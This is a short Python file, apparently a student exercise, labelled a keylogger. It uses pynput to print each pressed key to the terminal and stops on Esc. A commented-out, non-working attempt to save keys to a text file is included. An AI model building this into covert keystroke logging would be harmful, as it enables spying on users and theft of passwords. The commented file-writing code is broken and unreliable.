# python keylogger program - Harit Talwar

print("Harit Talwar")
# Python keylogger program - Harit Talwar
# Identify keylistener and store all keys being typed into terminal that can later be converted into text file

import pynput

from pynput.keyboard import Key, Listener

#countVar = 0 #this counter variable will allow us to update the key file frequently in case the user exits out of the kylogger
#emptyKeysList = []

#Listener listens for user's key events

def when_key_is_pressed(key):
    #global emptyKeyList, countVar
    #emptyKeysList.append(key)
    #countVar += 1
    print("{0} pressed".format(key))
#
#     if countVar >= 25: #every 25 keys pressed, the file will be updated
#         count = 0
#         write_file(emptyKeysList)
#         emptyKeysList = []
#
# def output_file(keys):
#         for key in emptyKeysList:
#             f.write(str(key)) # is generates all keys pressed into the created text file
#         # "as f:" stands for append mode
#         #"w" represents "write" which allows the program to generate a text file

def when_key_is_released(key):
    if key == Key.esc:
        return False

with Listener(on_press=when_key_is_pressed, on_release=when_key_is_released) as listener:
        listener.join()
# the loop presented above will continue to run as long as program forces the user to break out of

#The commented out lines of code represent my attempt into storing all the keys pressed into a .txt file. I wanted to create a new .txt file every 25 characters.
#Although this was unsuccessfull, the program still tracks all the keys pressed on a keyboard.
